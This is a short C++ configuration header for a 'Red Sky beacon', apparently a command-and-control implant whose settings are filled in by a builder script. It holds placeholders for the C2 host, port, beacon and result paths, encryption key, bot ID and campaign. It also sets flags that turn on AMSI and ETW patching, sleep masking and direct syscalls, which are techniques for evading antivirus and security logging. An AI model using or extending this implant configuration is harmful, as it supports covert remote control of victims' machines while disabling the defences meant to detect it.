// language: C++, file: config.hpp, target: Red Sky beacon — build-time config
// Placeholders {{...}} are replaced by builder.py at compile time.

#pragma once

// C2 endpoint — injected by builder.py
static const char* C2_HOST        = "{{C2_HOST}}";
static const int   C2_PORT        = {{C2_PORT}};
static const char* C2_BEACON_PATH = "{{C2_BEACON_PATH}}";
static const char* C2_RESULT_PATH = "{{C2_RESULT_PATH}}";
static const bool  C2_TLS         = {{C2_TLS}};

// Beacon timing
static const int   SLEEP_SECONDS  = {{C2_SLEEP}};
static const float JITTER         = {{C2_JITTER}};

// Identity — persisted on the target
static const char* BOT_ID         = "{{BOT_ID}}";
static const char* CAMPAIGN       = "{{CAMPAIGN}}";

// AES-GCM key — 32 bytes as hex
static const char* AES_KEY_HEX    = "{{AES_KEY_HEX}}";

// Runtime flags
#define REDSKY_USE_AMSI_PATCH   1
#define REDSKY_USE_ETW_PATCH    1
#define REDSKY_USE_SLEEP_MASK   1
#define REDSKY_USE_SYSCALLS     1
